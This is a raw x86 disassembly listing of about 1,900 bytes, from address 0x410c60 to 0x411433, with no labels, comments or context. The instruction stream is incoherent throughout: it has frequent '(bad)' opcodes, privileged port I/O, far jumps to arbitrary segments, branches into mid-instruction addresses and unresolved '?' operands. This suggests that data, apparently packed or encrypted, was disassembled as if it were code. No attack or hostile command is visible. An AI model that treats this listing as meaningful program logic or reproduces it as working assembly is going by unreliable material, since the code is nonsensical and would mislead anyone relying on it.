  410c60:	stc    
  410c61:	aam    0xed
  410c63:	cmc    
  410c64:	ret    
  410c65:	imul   ecx,DWORD PTR [edx+0x7e9c75d7],0x24
  410c6c:	xchg   ebx,eax
  410c6d:	ja     0x410cd5
  410c6f:	sti    
  410c70:	(bad)  
  410c71:	mov    esi,DWORD PTR [edx]
  410c73:	pushf  
  410c74:	or     eax,0xd20c86ae
  410c79:	pop    edx
  410c7a:	je     0x410c85
  410c7c:	jmp    0x6180455d
  410c81:	mov    ecx,0xbac54317
  410c86:	xor    DWORD PTR [ebp-0x6a0a27d2],0x1b
  410c8d:	std    
  410c8e:	out    0xdc,al
  410c90:	idiv   BYTE PTR [edi]
  410c92:	add    ah,dl
  410c94:	call   0x42b63028
  410c99:	push   esi
  410c9a:	jae    0x410c9d
  410c9c:	dec    edi
  410c9d:	cmp    al,0x9a
  410c9f:	adc    bl,BYTE PTR [eax+ebx*4+0x7a]
  410ca3:	ret    0x5383
  410ca6:	pop    edi
  410ca7:	jg     0x410ccf
  410ca9:	or     eax,0xa173190
  410cae:	cs sub al,0xe7
  410cb1:	cmp    eax,DWORD PTR [edx-0x60]
  410cb4:	test   BYTE PTR [ebx+0x5],cl
  410cb7:	jp     0x410c50
  410cb9:	jl     0x410c9c
  410cbb:	jg     0x410cad
  410cbd:	xor    eax,0x68180a0b
  410cc2:	cmp    DWORD PTR [ecx+0x7ce0a32b],0x77a70e9b
  410ccc:	aas    
  410ccd:	add    dh,BYTE PTR [esi]
  410ccf:	addr16 jne 0x410c6d
  410cd2:	xchg   edi,eax
  410cd3:	mov    bh,0xdd
  410cd5:	xor    DWORD PTR [ebp-0x1f],ecx
  410cd8:	dec    esi
  410cd9:	(bad)  
  410cda:	ds jmp 0x410cb2
  410cdd:	(bad)  [ebx]
  410cdf:	scas   eax,DWORD PTR es:[edi]
  410ce0:	ja     0x410cca
  410ce2:	inc    ebx
  410ce3:	and    edx,DWORD PTR [eax]
  410ce5:	mov    edx,0x75f251d3
  410cea:	loope  0x410c7e
  410cec:	mov    bl,0x17
  410cee:	mov    ebp,0xe9aedad7
  410cf3:	stos   DWORD PTR es:[edi],eax
  410cf4:	ss jne 0x410ccb
  410cf7:	or     BYTE PTR [eax+0x7],bl
  410cfa:	pusha  
  410cfb:	xlat   BYTE PTR ds:[ebx]
  410cfc:	or     al,0x33
  410cfe:	dec    esp
  410cff:	xchg   ecx,ebx
  410d01:	(bad)  
  410d02:	bound  esi,QWORD PTR [ecx+ecx*2-0x3a]
  410d06:	call   0x573c:0x8f1112e9
  410d0d:	fnop   
  410d0f:	dec    esp
  410d10:	nop
  410d11:	aas    
  410d12:	bound  edi,QWORD PTR [ebx+0x5f22f202]
  410d18:	out    0xc0,al
  410d1a:	push   ebx
  410d1b:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  410d1d:	in     eax,0x4e
  410d1f:	addr16 mov ah,0x78
  410d22:	int3   
  410d23:	push   0xd1213354
  410d28:	inc    ecx
  410d29:	adc    al,0x27
  410d2b:	retf   0x122c
  410d2e:	mov    cl,0x8e
  410d30:	or     DWORD PTR [ecx+eax*4-0x7e],ecx
  410d34:	inc    eax
  410d35:	popf   
  410d36:	pushf  
  410d37:	fs push ebx
  410d39:	call   0x17bc:0xe6636d02
  410d40:	fmul   DWORD PTR ds:0xbd87691b
  410d46:	pop    ecx
  410d47:	loop   0x410d59
  410d49:	loopne 0x410d42
  410d4b:	pop    ecx
  410d4c:	pop    esp
  410d4d:	mov    bl,ah
  410d4f:	out    0x12,eax
  410d51:	or     edx,DWORD PTR [ecx]
  410d53:	cmp    BYTE PTR [esi+ecx*8],bl
  410d56:	js     0x410cf8
  410d58:	xchg   esp,eax
  410d59:	jne    0x410d97
  410d5b:	ficom  DWORD PTR [ebx-0x78]
  410d5e:	pusha  
  410d5f:	scas   al,BYTE PTR es:[edi]
  410d60:	jno    0x410cf5
  410d62:	add    eax,0x5ee41749
  410d67:	test   al,0xd5
  410d69:	or     ah,dl
  410d6b:	mov    al,ds:0xcd827164
  410d70:	xor    edx,ecx
  410d72:	pop    es
  410d73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d74:	xor    DWORD PTR [edi+0x61f76c56],eax
  410d7a:	xlat   BYTE PTR ds:[ebx]
  410d7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d7c:	test   eax,0x670d09d6
  410d81:	xchg   ecx,eax
  410d82:	mov    ds:0x94513104,al
  410d87:	jno    0x410d42
  410d89:	test   eax,0xc17792d9
  410d8e:	xchg   esp,eax
  410d8f:	dec    edx
  410d90:	(bad)  
  410d91:	push   edi
  410d92:	xor    edx,esi
  410d94:	jmp    ebx
  410d96:	xor    ebx,edi
  410d98:	xor    DWORD PTR [ebx+0x34],ebp
  410d9b:	fisttp WORD PTR [esi+0x41d4f646]
  410da1:	jecxz  0x410d9f
  410da3:	call   0xb179d3f1
  410da8:	xchg   ebp,eax
  410da9:	ficom  WORD PTR [esi]
  410dab:	mov    ah,0x95
  410dad:	loopne 0x410d34
  410daf:	fnsave [ebp+0x35]
  410db2:	inc    edi
  410db3:	or     eax,0x7974668
  410db8:	js     0x410dfa
  410dba:	loop   0x410d5c
  410dbc:	vpsubw xmm7,xmm3,XMMWORD PTR [esi+0x48dc5040]
  410dc4:	pop    bx
  410dc6:	nop
  410dc7:	loope  0x410e1d
  410dc9:	pop    ebp
  410dca:	ror    dh,0x7c
  410dcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410dce:	jne    0x410e3c
  410dd0:	dec    esp
  410dd1:	add    DWORD PTR ds:[ebp+0x53],esi
  410dd5:	mov    bh,0x1d
  410dd7:	mov    dh,0x8b
  410dd9:	test   DWORD PTR [eax+0x3763112e],ebx
  410ddf:	push   0xffffff9c
  410de1:	dec    ebx
  410de2:	xor    eax,0xf00d472
  410de7:	and    DWORD PTR [eax],ebx
  410de9:	ins    BYTE PTR es:[edi],dx
  410dea:	mov    ah,BYTE PTR [ebp-0x76]
  410ded:	adc    eax,0xecee7f93
  410df2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410df3:	out    0xca,al
  410df5:	xchg   edi,eax
  410df6:	pop    ecx
  410df7:	inc    ebp
  410df8:	xchg   esi,eax
  410df9:	mov    bl,0xaf
  410dfb:	sbb    dl,BYTE PTR [esi]
  410dfd:	pusha  
  410dfe:	xchg   ebx,eax
  410dff:	cmp    esi,0x1e88aa89
  410e05:	or     dh,dl
  410e07:	popa   
  410e08:	inc    edi
  410e09:	and    BYTE PTR [ebx],0xc1
  410e0c:	xor    edx,eax
  410e0e:	outs   dx,DWORD PTR ds:[esi]
  410e0f:	cld    
  410e10:	outs   dx,BYTE PTR ds:[esi]
  410e11:	xlat   BYTE PTR ds:[ebx]
  410e12:	mov    esp,ebx
  410e14:	je     0x410e4a
  410e16:	popa   
  410e17:	pop    esp
  410e18:	aam    0x7
  410e1a:	call   0x7ce2d13e
  410e1f:	lock xchg BYTE PTR [esi],bh
  410e22:	dec    edx
  410e23:	add    DWORD PTR [ebx-0x32],0x9d9cc2e4
  410e2a:	in     eax,dx
  410e2b:	jmp    0x410e6e
  410e2d:	mov    bl,0xbd
  410e2f:	xlat   BYTE PTR ds:[ebx]
  410e30:	scas   al,BYTE PTR es:[edi]
  410e31:	xlat   BYTE PTR ds:[ebx]
  410e32:	sub    al,0xa4
  410e34:	and    al,0x53
  410e36:	adc    BYTE PTR [edx],0xed
  410e39:	adc    DWORD PTR ds:[edx+0x56b875a2],esp
  410e40:	lahf   
  410e41:	dec    ecx
  410e42:	cmp    ecx,edx
  410e44:	xor    DWORD PTR [ecx+eiz*2+0x1],esp
  410e48:	lahf   
  410e49:	mov    BYTE PTR [edx-0x25e1936e],bh
  410e4f:	repz inc ebx
  410e51:	jns    0x410df8
  410e53:	mov    edx,0x4aaa0437
  410e58:	mov    al,0x4f
  410e5a:	sub    BYTE PTR [edx],ah
  410e5c:	or     esp,edi
  410e5e:	bnd jb 0x410e66
  410e61:	test   BYTE PTR [edx+0x70],bl
  410e64:	xor    al,0x6b
  410e66:	mov    al,ds:0xfcc9f8e8
  410e6b:	int3   
  410e6c:	jmp    DWORD PTR [ecx-0x5f]
  410e6f:	mov    dl,0x65
  410e71:	(bad)  
  410e72:	div    edi
  410e74:	mov    cl,dh
  410e76:	fsubr  DWORD PTR ds:0xbe243da7
  410e7c:	fsub   DWORD PTR [ecx-0x4351a976]
  410e82:	sub    al,0x16
  410e84:	mov    WORD PTR [edx+0x1f],?
  410e87:	or     ah,BYTE PTR [ebx]
  410e89:	ret    
  410e8a:	pop    ds
  410e8b:	aas    
  410e8c:	xor    edx,edx
  410e8e:	adc    BYTE PTR [ecx-0x62],bl
  410e91:	das    
  410e92:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  410e94:	jnp    0x410e59
  410e96:	test   eax,0x42eae621
  410e9b:	inc    edi
  410e9c:	cwde   
  410e9d:	imul   esp,DWORD PTR [eax],0x61034faa
  410ea3:	cmp    DWORD PTR [edi+0x75],edx
  410ea6:	mov    bl,0x21
  410ea8:	or     ch,bl
  410eaa:	fidiv  DWORD PTR [esi+edi*8]
  410ead:	xor    edx,eax
  410eaf:	adc    eax,0xc1b0c338
  410eb4:	cwde   
  410eb5:	call   0x3012a1f3
  410eba:	iret   
  410ebb:	out    dx,eax
  410ebc:	mov    ecx,0xc4866611
  410ec1:	cmp    ebp,DWORD PTR [ebx-0x66]
  410ec4:	mov    ds:0x483b7787,eax
  410ec9:	lods   al,BYTE PTR ds:[esi]
  410eca:	dec    esi
  410ecb:	adc    ah,BYTE PTR [eax]
  410ecd:	cmp    DWORD PTR [ecx],eax
  410ecf:	fidivr WORD PTR [ecx+0x49]
  410ed2:	lock add BYTE PTR [eax-0x64917268],ah
  410ed9:	sti    
  410eda:	mov    dh,0x52
  410edc:	pop    eax
  410edd:	dec    esi
  410ede:	sti    
  410edf:	shl    esi,1
  410ee1:	mov    WORD PTR [esi+0x66d0f8d3],ds
  410ee7:	sti    
  410ee8:	(bad)  
  410ee9:	jno    0x410e9b
  410eeb:	mov    ebx,0x7e66b28e
  410ef0:	outs   dx,BYTE PTR ds:[esi]
  410ef1:	rcr    BYTE PTR [esi+0xc],cl
  410ef4:	(bad)  
  410ef6:	ds mov ch,0x40
  410ef9:	sub    BYTE PTR [esi],al
  410efb:	outs   dx,BYTE PTR ds:[esi]
  410efc:	dec    ebp
  410efd:	into   
  410efe:	and    BYTE PTR [edx],bh
  410f00:	sub    BYTE PTR [edi+0x597ea71a],ah
  410f06:	(bad)  
  410f07:	in     al,0x88
  410f09:	dec    ebp
  410f0a:	js     0x410f64
  410f0c:	jb     0x410f14
  410f0e:	push   eax
  410f0f:	mov    al,0x65
  410f11:	dec    eax
  410f12:	and    BYTE PTR ds:0x3f1898ab,ch
  410f18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f19:	adc    esi,DWORD PTR [ebx+0x4b215975]
  410f1f:	pop    esi
  410f20:	xor    eax,0x45e4d3ce
  410f25:	mov    bh,0x2a
  410f27:	pop    ds
  410f28:	or     ebx,DWORD PTR [esp+eax*4+0x1f]
  410f2c:	bts    DWORD PTR [ebx],edi
  410f2f:	(bad)  
  410f31:	and    BYTE PTR [esi],0xff
  410f34:	mov    eax,ds:0xa5857cdf
  410f39:	xor    eax,0x9e74e2ad
  410f3e:	stos   BYTE PTR es:[edi],al
  410f3f:	fisubr WORD PTR [ebx-0x756144e4]
  410f45:	and    dh,BYTE PTR [ebx+eiz*2-0x109c300]
  410f4c:	jmp    0x410f0e
  410f4e:	imul   ecx,esi,0x4
  410f51:	hlt    
  410f52:	std    
  410f53:	enter  0xd934,0x42
  410f57:	ins    DWORD PTR es:[edi],dx
  410f58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f59:	(bad)  
  410f5b:	pop    ebx
  410f5c:	mov    ds:0x10875cea,eax
  410f61:	jp     0x410f2a
  410f63:	adc    eax,0x8d40ec92
  410f68:	and    bl,BYTE PTR ds:0x4a33c517
  410f6e:	mov    ebp,0x7fd1cbda
  410f73:	mov    ds:0x23444289,eax
  410f78:	sahf   
  410f79:	mov    ebx,0x14456e6b
  410f7e:	idiv   BYTE PTR [edi-0x4d40614e]
  410f84:	aam    0x15
  410f86:	jmp    0xfe6ca0cd
  410f8b:	sbb    edi,DWORD PTR [edi+0x28352fbe]
  410f91:	mov    dl,0x58
  410f93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f94:	cmp    BYTE PTR [edx-0xbcf5779],0x77
  410f9b:	fistp  WORD PTR [eax]
  410f9d:	inc    ebx
  410f9e:	push   ecx
  410f9f:	pop    esp
  410fa0:	mov    bl,0x6
  410fa2:	push   ebx
  410fa3:	jbe    0x410f65
  410fa5:	ss js  0x410fd7
  410fa8:	jne    0x410fe1
  410faa:	test   al,0xc0
  410fac:	les    eax,FWORD PTR [edx]
  410fae:	test   DWORD PTR [ecx+0xa],ebx
  410fb1:	in     eax,dx
  410fb2:	jne    0x41102f
  410fb4:	in     eax,dx
  410fb5:	mov    ebx,0x919ce3f1
  410fba:	mov    eax,0x84fb6f05
  410fbf:	adc    al,BYTE PTR cs:[eax-0x1e9fe2de]
  410fc6:	fadd   st,st(7)
  410fc8:	jl     0x41101b
  410fca:	add    esi,esi
  410fcc:	jp     0x410faa
  410fce:	push   ebx
  410fcf:	aam    0x5d
  410fd1:	and    BYTE PTR [ebp-0x7a029c69],bh
  410fd7:	and    eax,0x7e4dc37a
  410fdc:	(bad)  [eax-0x25]
  410fdf:	mov    dl,0xf
  410fe1:	jmp    0x5f2fe588
  410fe6:	pusha  
  410fe7:	jmp    ecx
  410fe9:	mov    BYTE PTR ds:0x30f406d0,0xfb
  410ff0:	ret    
  410ff1:	xor    DWORD PTR ds:[di],edi
  410ff5:	or     al,0xa6
  410ff7:	jl     0x410fef
  410ff9:	sbb    bh,BYTE PTR [ebp-0x7c]
  410ffc:	pusha  
  410ffd:	mov    esi,DWORD PTR [ebx-0xc4f879a]
  411003:	out    dx,al
  411004:	dec    esi
  411005:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411006:	fsubr  QWORD PTR [ebp+0x5c]
  411009:	xchg   DWORD PTR [ebp-0x7d],esi
  41100c:	pop    esp
  41100d:	hlt    
  41100e:	retf   
  41100f:	mov    ds:0x9cdd3dd2,eax
  411014:	dec    esi
  411015:	test   DWORD PTR ds:0xc68e1b23,edx
  41101b:	enterw 0x8b5a,0x62
  411020:	sbb    DWORD PTR [ebx+0x5279cab3],esi
  411026:	adc    DWORD PTR [ebx+0x37],edx
  411029:	xor    BYTE PTR [eax+eax*1-0x731eaa73],bl
  411030:	cmp    BYTE PTR [ebp+0xd09e32b],cl
  411036:	push   esp
  411037:	lods   al,BYTE PTR ds:[esi]
  411038:	jnp    0x4110a4
  41103a:	pop    edx
  41103b:	outs   dx,BYTE PTR ds:[esi]
  41103c:	xor    ch,BYTE PTR [edi+0x1f]
  41103f:	sub    bh,ch
  411041:	fild   QWORD PTR [ebx-0x6d]
  411044:	jbe    0x411023
  411046:	sbb    BYTE PTR [esi],0xb4
  411049:	in     al,0x27
  41104b:	(bad)  
  41104c:	push   ebp
  41104d:	push   edi
  41104e:	push   0x8290b10b
  411053:	scas   eax,DWORD PTR es:[edi]
  411054:	dec    edx
  411055:	pusha  
  411056:	xchg   edi,eax
  411057:	pusha  
  411058:	pop    esi
  411059:	xchg   ecx,eax
  41105a:	jnp    0x411072
  41105c:	push   0xe
  41105e:	inc    edi
  41105f:	xor    dl,BYTE PTR [edi-0x29f3ed68]
  411065:	xor    bl,BYTE PTR [edi]
  411067:	jne    0x4110c0
  411069:	add    BYTE PTR [edx+edi*1-0x39efcdd3],ch
  411070:	and    DWORD PTR [edx-0x2],esp
  411073:	test   BYTE PTR ds:0xa93e75d6,bh
  411079:	pop    edx
  41107a:	xor    al,0x29
  41107c:	out    dx,eax
  41107d:	in     eax,dx
  41107e:	stos   DWORD PTR es:[edi],eax
  41107f:	push   esp
  411080:	aam    0x14
  411082:	aaa    
  411083:	shr    DWORD PTR [ecx],cl
  411085:	pop    edi
  411086:	or     dl,bh
  411088:	pop    edx
  411089:	adc    bh,cl
  41108b:	call   0xcdedb6e5
  411090:	shr    DWORD PTR [eax-0xeb6506c],0x76
  411097:	test   al,0x6c
  411099:	mov    esp,0x9c454d17
  41109e:	leave  
  41109f:	pop    ss
  4110a0:	fsubr  st(2),st
  4110a2:	(bad)  
  4110a3:	loop   0x41107a
  4110a5:	or     DWORD PTR [edx],0x2f
  4110a8:	cmp    cl,BYTE PTR [edi+0x62]
  4110ab:	dec    eax
  4110ac:	aam    0xa6
  4110ae:	gs ret 0xb5b2
  4110b2:	jmp    0x8d6f:0xb22f5f4d
  4110b9:	ins    BYTE PTR es:[edi],dx
  4110ba:	scas   al,BYTE PTR es:[edi]
  4110bb:	jmp    0x948bc27e
  4110c0:	sbb    DWORD PTR [eax-0x771592d3],0xffffff99
  4110c7:	aaa    
  4110c8:	jmp    DWORD PTR [ebx]
  4110ca:	cmp    eax,0xf0c7ff46
  4110cf:	xchg   ebp,eax
  4110d0:	(bad)  
  4110d1:	sar    DWORD PTR [edi],cl
  4110d3:	sub    eax,0xe87509d
  4110d8:	push   ebx
  4110d9:	cmp    dh,al
  4110db:	rcl    BYTE PTR [ebx+0x6b62b71b],0x39
  4110e2:	test   dh,bh
  4110e4:	cdq    
  4110e5:	gs xchg edi,eax
  4110e7:	lock test eax,0x3e22c949
  4110ed:	xlat   BYTE PTR ds:[ebx]
  4110ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110ef:	sti    
  4110f0:	fild   WORD PTR [edi]
  4110f2:	addr16 cld 
  4110f4:	jge    0x411169
  4110f6:	mov    cs,esp
  4110f8:	adc    eax,0xb1c96026
  4110fd:	mov    dh,0x37
  4110ff:	enter  0x526e,0x5d
  411103:	jns    0x41112a
  411105:	push   edx
  411106:	adc    eax,0xb9436bdb
  41110b:	or     al,0xe1
  41110d:	mov    esp,0xffb63abf
  411112:	inc    esp
  411113:	fwait
  411114:	icebp  
  411115:	je     0x41118a
  411117:	or     eax,0xd57272d6
  41111c:	sub    edi,DWORD PTR [eax-0x298395b6]
  411122:	mov    ah,bl
  411124:	call   0x6d04:0xa8ab3750
  41112b:	pop    edx
  41112c:	push   ecx
  41112d:	sub    ch,0x73
  411130:	loop   0x4110c6
  411132:	add    al,BYTE PTR [esi+0x5]
  411135:	adc    eax,0x3def2317
  41113a:	add    ecx,ecx
  41113c:	xchg   ecx,eax
  41113d:	daa    
  41113e:	or     DWORD PTR [esp+ebp*2],0x2b
  411142:	call   0xb5e6:0xc10fbfb
  411149:	js     0x4110fd
  41114b:	jl     0x411108
  41114d:	xchg   ebp,eax
  41114e:	jmp    0x4a61:0x875b97dd
  411155:	inc    esp
  411156:	add    eax,0xaf13b73a
  41115b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41115c:	inc    esi
  41115d:	addr16 in al,dx
  41115f:	and    eax,DWORD PTR [edx+0x7470a214]
  411165:	push   ecx
  411166:	es repnz push ebx
  411169:	cmp    al,0xb8
  41116b:	mov    ah,ch
  41116d:	(bad)
  411170:	xor    eax,0x6f48ef8
  411175:	xor    al,0xec
  411177:	rcr    BYTE PTR [ebx-0x1240756d],0x76
  41117e:	add    ch,BYTE PTR [esi+0x1d933942]
  411184:	sti    
  411185:	sub    DWORD PTR [edi+0x1],esi
  411188:	and    edi,ecx
  41118a:	mov    ecx,0xe3148708
  41118f:	jle    0x4111b0
  411191:	mov    ch,0xc3
  411193:	xchg   BYTE PTR [ebx-0x3b],ah
  411196:	out    0x46,al
  411198:	pop    es
  411199:	add    BYTE PTR [ebp+0x7a],al
  41119c:	xchg   ecx,eax
  41119d:	(bad)  
  41119e:	sbb    dh,BYTE PTR [ebx+0x11425190]
  4111a4:	sbb    DWORD PTR [eax],edx
  4111a6:	repnz clc 
  4111a8:	cli    
  4111a9:	(bad)  
  4111aa:	loop   0x411175
  4111ac:	enter  0x5ade,0xea
  4111b0:	sub    ebp,DWORD PTR [eax-0x65]
  4111b3:	sbb    esp,esp
  4111b5:	mov    ds:0x499b280a,al
  4111ba:	sub    DWORD PTR [edi-0x1b],ecx
  4111bd:	push   edi
  4111be:	fdivp  st(0),st
  4111c0:	pop    eax
  4111c1:	mov    dh,BYTE PTR ds:0x86fc00f
  4111c7:	(bad)  
  4111c8:	pop    ds
  4111c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111ca:	push   ebp
  4111cb:	xchg   edx,eax
  4111cc:	jnp    0x4111d9
  4111ce:	inc    ebp
  4111cf:	in     eax,dx
  4111d0:	fwait
  4111d1:	mov    al,ds:0xfba79761
  4111d6:	or     dl,0xfa
  4111d9:	data16 sbb al,0x9e
  4111dc:	rcr    BYTE PTR [esi],1
  4111de:	mov    edx,eax
  4111e0:	dec    edi
  4111e1:	mov    ds:0x13c79a86,al
  4111e6:	jo     0x411207
  4111e8:	push   ebp
  4111e9:	les    edx,FWORD PTR [ebp+0x5]
  4111ec:	imul   ebp,DWORD PTR [eax-0x15546466],0x4c4f1bc9
  4111f6:	cli    
  4111f7:	test   DWORD PTR [ebx],ebx
  4111f9:	aaa    
  4111fa:	sbb    BYTE PTR [edx-0x4f],bh
  4111fd:	adc    eax,0x63c5fb2f
  411202:	cdq    
  411203:	pop    es
  411204:	pushf  
  411205:	inc    eax
  411206:	push   es
  411207:	mov    eax,0x7ca1fbd1
  41120c:	jnp    0x4111c7
  41120e:	cmp    BYTE PTR [ecx+0x4c8f8ca9],bh
  411214:	test   eax,0x7d89e654
  411219:	cmp    DWORD PTR [edi+0x2995323c],ebx
  41121f:	sub    eax,0xb7328873
  411224:	mov    ebx,0x93cade10
  411229:	fstp   QWORD PTR [ebp+0x1]
  41122c:	dec    ebp
  41122d:	cmc    
  41122e:	add    ch,BYTE PTR [ebx]
  411230:	shl    ch,0x93
  411233:	mul    DWORD PTR [eax+0x62]
  411236:	mov    ebx,0x3d9f834e
  41123b:	(bad)  [esi]
  41123d:	shl    bh,cl
  41123f:	daa    
  411240:	xor    eax,0xb44ce89d
  411245:	aaa    
  411246:	cmp    esi,DWORD PTR [ebx]
  411248:	leave  
  411249:	aas    
  41124a:	sbb    ah,BYTE PTR [edx]
  41124c:	nop
  41124d:	pop    edx
  41124e:	mov    edi,0xe489133f
  411253:	jmp    0x4112cb
  411255:	sar    BYTE PTR gs:[edi+0x436e0f0c],0xfa
  41125d:	push   ebx
  41125e:	jecxz  0x411219
  411260:	mov    edi,0x2694c668
  411265:	dec    edx
  411266:	js     0x4111f5
  411268:	jmp    0x6afd:0xe0c17f27
  41126f:	xor    edi,edx
  411271:	out    dx,eax
  411272:	scas   eax,DWORD PTR es:[edi]
  411273:	inc    BYTE PTR ds:0x6dbe6509
  411279:	stc    
  41127a:	cmp    DWORD PTR [ebx-0x40022875],ecx
  411280:	mov    edi,0xa7171d43
  411285:	fldenv [ebx-0x5d]
  411288:	jg     0x4112d8
  41128a:	mov    esp,0x95bdc706
  41128f:	mov    WORD PTR [edi+0x31],?
  411292:	mov    al,0x2c
  411294:	pop    ebp
  411295:	in     al,dx
  411296:	jg     0x411235
  411298:	popa   
  411299:	icebp  
  41129a:	out    0xdc,al
  41129c:	(bad)  
  41129d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41129e:	lods   al,BYTE PTR ds:[esi]
  41129f:	pusha  
  4112a0:	mov    esp,0xd40cf19e
  4112a5:	jbe    0x4112f6
  4112a7:	pop    edi
  4112a8:	mov    ds:0xdfb2c18b,eax
  4112ad:	jg     0x41127f
  4112af:	icebp  
  4112b0:	mov    edx,ecx
  4112b2:	mov    al,ds:0x2a0a88ee
  4112b7:	and    ecx,DWORD PTR [ecx+0x67]
  4112ba:	mov    esi,0x992149ed
  4112bf:	inc    esp
  4112c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112c1:	mov    dh,0xf9
  4112c3:	jg     0x4112ff
  4112c5:	aaa    
  4112c6:	sti    
  4112c7:	clc    
  4112c8:	aaa    
  4112c9:	ret    0x5b69
  4112cc:	xchg   esi,eax
  4112cd:	pop    esp
  4112ce:	adc    DWORD PTR [ebp+ebp*1-0x6],0x16
  4112d3:	daa    
  4112d4:	aad    0xb0
  4112d6:	pop    ds
  4112d7:	mov    eax,0x21f3cb4f
  4112dc:	mov    ds:0x7d1088dd,al
  4112e1:	push   DWORD PTR [eax-0x393580db]
  4112e7:	lods   al,BYTE PTR ds:[esi]
  4112e8:	sti    
  4112e9:	aas    
  4112ea:	in     al,dx
  4112eb:	addr16 inc esp
  4112ed:	cli    
  4112ee:	lods   eax,DWORD PTR ds:[esi]
  4112ef:	bound  esp,QWORD PTR [edi]
  4112f1:	or     ecx,ebp
  4112f3:	rcl    BYTE PTR [ecx-0x26],0x9f
  4112f7:	push   ss
  4112f8:	adc    eax,0xefbccbd6
  4112fd:	out    0xe8,eax
  4112ff:	call   0xeaf3:0xfb3ca0b3
  411306:	shl    DWORD PTR [esi-0x4679baca],cl
  41130c:	cmp    eax,0xdd15d627
  411311:	hlt    
  411312:	pop    eax
  411313:	push   ebp
  411314:	and    al,0xd8
  411316:	leave  
  411317:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411318:	sahf   
  411319:	jns    0x411342
  41131b:	add    DWORD PTR [ecx-0x2367f20e],edx
  411321:	xlat   BYTE PTR ds:[ebx]
  411322:	mov    esp,0xc436e829
  411327:	push   edi
  411328:	fnstenv [esi]
  41132a:	inc    bh
  41132c:	aad    0x1
  41132e:	sub    al,0xd3
  411330:	dec    ebx
  411331:	retf   0xb742
  411334:	jl     0x411346
  411336:	xor    ecx,DWORD PTR ds:0x90e233ff
  41133c:	cmp    BYTE PTR [eax-0x42d6658b],ch
  411342:	xor    edi,DWORD PTR [edi]
  411344:	sbb    ebx,DWORD PTR [ecx]
  411346:	mov    WORD PTR [edi+0x62eb299],?
  41134c:	push   ss
  41134d:	in     al,0xfa
  41134f:	pusha  
  411350:	inc    edi
  411351:	daa    
  411352:	mov    BYTE PTR [edx-0x59253b8f],dh
  411358:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41135a:	jbe    0x411321
  41135c:	xchg   ecx,eax
  41135d:	xrelease xchg BYTE PTR [ecx],bl
  411360:	cld    
  411361:	dec    edx
  411362:	aas    
  411363:	jg     0x41132d
  411365:	sbb    edx,DWORD PTR [ebx]
  411367:	jl     0x411310
  411369:	sub    esp,edi
  41136b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41136c:	xor    al,0xa4
  41136e:	sar    DWORD PTR [esi],1
  411370:	cld    
  411371:	daa    
  411372:	scas   eax,DWORD PTR es:[edi]
  411373:	cdq    
  411374:	outs   dx,BYTE PTR ds:[esi]
  411375:	ds mov ch,0x67
  411378:	lods   eax,DWORD PTR ds:[esi]
  411379:	in     eax,0xac
  41137b:	(bad)
  41137e:	adc    BYTE PTR ds:0xa77fe709,dl
  411384:	call   0x4c74e967
  411389:	sbb    BYTE PTR [bx+di-0x10],0x14
  41138e:	mov    edx,0xc7dc054e
  411393:	test   al,0x56
  411395:	mov    ebx,0x758dc505
  41139a:	or     BYTE PTR [eax+0x3a19c0fe],cl
  4113a0:	les    edi,FWORD PTR ds:0xd3d99651
  4113a6:	int3   
  4113a7:	xchg   ebx,eax
  4113a8:	into   
  4113a9:	xchg   esp,esi
  4113ab:	push   esp
  4113ac:	mov    esi,0xcc233ec1
  4113b1:	in     al,0x81
  4113b3:	adc    al,0x7d
  4113b5:	(bad)  
  4113b6:	jg     0x411419
  4113b8:	in     al,dx
  4113b9:	or     ah,BYTE PTR [edx+eiz*4+0x764f4a3]
  4113c0:	or     al,0x4a
  4113c2:	lea    edx,[ecx+0x6755771c]
  4113c8:	(bad)  
  4113c9:	hlt    
  4113ca:	ret    
  4113cb:	stos   BYTE PTR es:[edi],al
  4113cc:	and    BYTE PTR [esi+0x1c81db60],0x95
  4113d3:	sahf   
  4113d4:	dec    ebp
  4113d5:	sub    ebx,DWORD PTR [edx-0x2d16595d]
  4113db:	sbb    dh,al
  4113dd:	jne    0x4113b3
  4113df:	or     ebp,ebp
  4113e1:	xchg   ecx,eax
  4113e2:	mov    dl,0x43
  4113e4:	(bad)  
  4113e5:	cli    
  4113e6:	out    dx,eax
  4113e7:	pop    ebp
  4113e8:	js     0x4113ad
  4113ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113eb:	ins    DWORD PTR es:[edi],dx
  4113ec:	pushf  
  4113ed:	inc    ecx
  4113ee:	ss push ebx
  4113f0:	inc    edi
  4113f1:	and    ebp,DWORD PTR [esi+0x63]
  4113f4:	repz pop ebx
  4113f6:	sti    
  4113f7:	sub    eax,0x2d731d17
  4113fc:	in     al,dx
  4113fd:	sti    
  4113fe:	dec    ecx
  4113ff:	aaa    
  411400:	and    al,0x7e
  411402:	aad    0xc
  411404:	out    dx,al
  411405:	add    DWORD PTR [edi-0x5eaa9fe2],edx
  41140b:	mov    dh,0x29
  41140d:	cmc    
  41140e:	nop
  41140f:	mov    esp,0x97fb1266
  411414:	jp     0x411464
  411416:	popf   
  411417:	cld    
  411418:	(bad)  
  41141a:	add    DWORD PTR [ebx],ecx
  41141c:	xchg   bl,bh
  41141e:	pop    ss
  41141f:	jo     0x411446
  411421:	ss repnz sub al,0xfd
  411425:	cmp    DWORD PTR [ecx-0x40],edx
  411428:	mov    edx,0x24d5fe35
  41142d:	mov    ebp,0xe9d5b7f0
  411432:	nop
  411433:	push   cs
